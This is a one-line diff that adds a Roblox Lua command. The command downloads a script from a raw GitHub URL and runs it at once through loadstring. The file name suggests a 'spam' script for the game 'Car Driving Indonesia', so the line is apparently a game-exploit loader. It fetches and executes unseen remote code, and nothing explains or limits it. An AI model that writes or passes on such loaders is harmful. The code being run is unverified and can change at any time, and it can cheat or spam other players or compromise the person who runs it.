@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/car-driving-indonesia-spam6-wjt6dnx1iji3ra.lua"))()
